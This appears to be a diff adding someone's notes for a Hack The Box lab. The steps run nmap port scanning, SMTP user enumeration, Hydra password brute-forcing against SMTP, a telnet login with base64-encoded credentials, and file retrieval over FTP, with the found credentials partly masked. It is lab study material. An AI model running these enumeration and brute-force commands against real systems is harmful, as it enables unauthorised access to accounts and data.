@@ -1,0 +1,45 @@
+Before we start, download the users.list and pws.list files from the HTB resources
+
+Start with checking the connection to the target 
+ping -c 1 <Target IP>
+
+nmap -Pn -p- --min-rate 3000 -sV -sC -n 10.129.113.80
+Notice the open ports 21 (FTP), 25 (smtp), 80 (http), 443 (ssl/https), 587 (smtp), 3306 (mysql)
+
+smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t <Target IP>
+Found user fi***@inlanefreight.htb
+
+Brute force the password for smtp using hydra
+hydra -l fi***@inlanefreight.htb -P /usr/share/seclists/Passwords/darkweb2017.txt smtp://<Target IP> -o smtpass -t 64
+Found smtp password 9********
+hydra 
+
+In a new shell turn username and password into base64 and leave it opened
+echo -ne "fi***@inlanefreight.htb" | base64
+echo -ne 9******** | base64
+
+In a new shell open a telnet connection
+telnet <Target IP> 25
+ehlo inlanefreight.htb
+auth login
+paste the base64 username
+paste the base64 password
+*Successfully authenticated*
+help -> check available commands
+*Nothing of interest found*
+
+Let's move onto mysql
+mysql -u fi***@inlanefreight.htb -p -h <Target IP>  --ssl
+*Access denied*
+
+Let's move onto ftp
+ftp <Target Ip> 21
+When prompted for user: fi***
+When prompted for pass: 9********
+dir
+*Wait a few minutes for it to finish*
+mget docs.txt WebServersInfo.txt
+y
+y
+*I moved the new files into /Desktop/Easy/ftp*
+Check the downloaded files
